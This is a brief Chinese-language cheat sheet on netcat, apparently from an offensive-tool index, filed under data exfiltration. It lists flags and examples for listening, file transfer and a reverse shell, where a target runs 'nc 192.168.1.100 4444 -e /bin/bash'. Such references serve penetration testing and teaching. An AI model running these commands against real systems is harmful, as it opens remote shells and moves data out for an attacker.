# netcat

## 简介
网络瑞士军刀，用于端口监听、连接、文件传输

## 核心参数
- `-l`: 监听模式
- `-p`: 指定端口
- `-e`: 执行命令（反向 shell）

## 命令示例
```bash
# 监听端口
nc -lvnp 4444

# 连接到远程主机
nc 192.168.1.100 4444

# 文件传输（接收端）
nc -lvnp 4444 > received_file.txt

# 文件传输（发送端）
nc 192.168.1.100 4444 < file.txt

# 反向 shell（攻击者监听）
nc -lvnp 4444

# 反向 shell（目标执行）
nc 192.168.1.100 4444 -e /bin/bash
```

## 使用场景
建立反向 shell 或传输文件的经典工具

## 所属分类
- [数据渗出 (Exfiltration)](../categories/21-exfiltration.md)
